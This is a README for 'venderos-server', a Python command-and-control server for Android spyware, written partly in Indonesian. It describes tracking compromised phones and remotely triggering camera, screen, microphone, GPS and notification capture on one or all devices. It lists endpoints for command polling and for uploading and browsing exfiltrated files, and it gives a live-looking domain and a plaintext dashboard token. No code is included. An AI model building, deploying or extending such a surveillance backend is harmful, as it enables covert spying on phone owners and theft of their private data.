# venderos-server

HTTP C2 receiver, device manager, and manual trigger server via Python 3 stdlib.

## Features

- **Live Device Tracking**: Mendeteksi perangkat terhubung, model HP, persentase baterai, aplikasi layar depan, IP, dan timestamp online.
- **Manual Trigger**: Eksekusi perintah instan (kamera, layar, mikrofon, GPS, notifikasi, atau all) secara manual per perangkat atau massal ke semua perangkat.
- **Web Dashboard**: Panel antarmuka web modern di `/dashboard` dengan live status, tombol trigger instan, dan feed berkas masuk.
- **Zero Dependency**: Berjalan penuh hanya menggunakan pustaka standar Python 3.

## Endpoints

- `GET /health` -> health check
- `GET /` atau `GET /dashboard` -> Web Control Panel
- `GET /api/devices` -> daftar perangkat terkoneksi (perlu header `X-Token` atau query `?token=...`)
- `POST /api/trigger` -> kirim trigger manual (`device_id`, `cmd`)
- `GET /api/feed` -> feed daftar berkas masuk terbaru
- `GET /files/<path>` -> unduh/buka berkas hasil exfiltrasi
- `POST /poll` -> heartbeat dan antrean perintah untuk klien Android
- `POST /u` -> upload berkas multipart (`kind`, `f`, header `X-Device-Id`)

## Quick Start

```bash
# Jalankan server
./run.sh
```

Akses Web Dashboard:
- `http://127.0.0.1:8080/dashboard`
- atau via domain: `https://venderos.my.id/dashboard`
- token = 1a0bd56a8676702528a4ec95989466172a25f55d

Panduan lengkap mengenai API, cURL trigger, dan uji coba ADB tersedia di [DOCS.md](DOCS.md).
